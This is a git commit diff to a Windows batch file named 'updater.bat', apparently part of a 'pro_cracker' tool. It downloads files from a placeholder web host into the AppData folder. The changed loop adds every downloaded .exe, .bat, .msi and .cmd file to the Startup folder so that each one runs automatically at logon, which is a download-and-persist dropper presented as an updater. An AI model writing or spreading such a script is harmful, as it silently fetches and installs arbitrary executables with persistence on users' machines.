4ab5f81df2ff98312ec317d70abeab8533b44e7a
thk34 <103599660+thk34@users.noreply.github.com>
2023-06-17 23:04:04 +0200

    Update updater.bat

--- updater.bat
+++ updater.bat
@@ -1,5 +1,5 @@
 @echo off
 powershell -command "Invoke-WebRequest -Uri 'http://your-website.com/folder/*' -OutFile '%APPDATA%\pro_cracker\*'"
-for %%i in ("%APPDATA%\pro_cracker\*.exe" "%APPDATA%\pro_cracker\*.bat" "%APPDATA%\pro_cracker\*.msi") do (
+for %%i in ("%APPDATA%\pro_cracker\*.exe" "%APPDATA%\pro_cracker\*.bat" "%APPDATA%\pro_cracker\*.msi" "%APPDATA%\pro_cracker\*.cmd") do (
     powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\'+(Split-Path -Leaf '%%i')+'.lnk');$s.TargetPath='%%i';$s.Save()"
 )
